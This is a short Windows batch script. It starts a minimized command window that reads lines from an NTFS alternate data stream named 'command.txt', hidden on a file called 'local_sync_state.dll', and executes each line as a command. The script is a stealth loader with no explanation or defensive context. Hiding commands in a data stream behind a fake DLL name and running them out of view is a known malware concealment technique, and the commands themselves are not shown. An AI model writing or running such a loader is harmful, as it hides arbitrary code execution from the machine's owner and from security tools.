@echo off
start /min cmd /k "for /f "delims=" %%i in (local_sync_state.dll:command.txt) do "%%i""